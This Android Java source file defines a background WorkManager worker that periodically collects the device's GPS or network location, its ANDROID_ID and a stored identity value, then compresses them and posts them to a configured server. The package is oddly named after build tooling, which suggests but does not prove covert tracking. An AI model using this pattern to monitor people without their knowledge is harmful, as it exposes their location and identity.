package org.code.coregradle.workers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.provider.Settings;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class LiveBasicInfoWorker extends Worker implements LocationListener {

    public static String WORKER_IDENTIFIER = "MercuryXLabs::LiveBasicInfoWorker";
    private LocationManager mLocationManager;
    private CountDownLatch mCountDownLatch;
    private Location currentLocation;
    private static OkHttpClient httpClient = new OkHttpClient();
    private final IdentityStore identityStore;

    public LiveBasicInfoWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        boolean isLocationGranted = ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        if (isLocationGranted) {
            if (mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 100_000, 10, this, Looper.getMainLooper());
            } else {
                mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 100_000, 10, this, Looper.getMainLooper());
            }
        }
        mCountDownLatch = new CountDownLatch(1);
        identityStore = IdentityStore.getInstance(context);
    }

    private JSONObject getRequestJSON(String androidId, String idValue, Location location) throws JSONException {
        JSONObject requestJSON = new JSONObject();
        requestJSON.put("androidId", androidId);
        requestJSON.put(this.identityStore.getIdentityKey(), idValue);
        if (location != null) {
            requestJSON.put("latitude", location.getLatitude());
            requestJSON.put("longitude", location.getLongitude());
        }
        return requestJSON;
    }

    private Result makeRequest(RequestBody requestBody) {
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.BASIC_INFO_URL)
                    .post(requestBody)
                    .build();
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return Result.success();
            }
        } catch (Exception ignored) {
        }
        return Result.failure();
    }

    @Override
    public void onLocationChanged(@NonNull Location location) {
        currentLocation = location;
        if (mCountDownLatch != null) {
            mCountDownLatch.countDown();
        }
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(@NonNull String provider) {

    }

    @Override
    public void onProviderDisabled(@NonNull String provider) {

    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            if (mCountDownLatch != null) {
                mCountDownLatch.await();
            }
            String idValue = identityStore.getIdentityValue();
            String androidId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
            mLocationManager.removeUpdates(this);
            JSONObject requestJSON = getRequestJSON(androidId, idValue, currentLocation);
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            return makeRequest(requestBody);
        } catch (Exception e) {
            return Result.failure();
        }
    }

    public static PeriodicWorkRequest getWorkRequest(int periodicity) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build();
        return new PeriodicWorkRequest.Builder(LiveBasicInfoWorker.class, periodicity, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .setBackoffCriteria(
                        BackoffPolicy.LINEAR,
                        OneTimeWorkRequest.MIN_BACKOFF_MILLIS,
                        TimeUnit.MILLISECONDS)
                .build();
    }

    public static OneTimeWorkRequest getOneTimeWorkRequest() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .build();
        return new OneTimeWorkRequest.Builder(LiveBasicInfoWorker.class)
                .setConstraints(constraints)
                .setBackoffCriteria(
                        BackoffPolicy.LINEAR,
                        OneTimeWorkRequest.MIN_BACKOFF_MILLIS,
                        TimeUnit.MILLISECONDS)
                .build();
    }
}
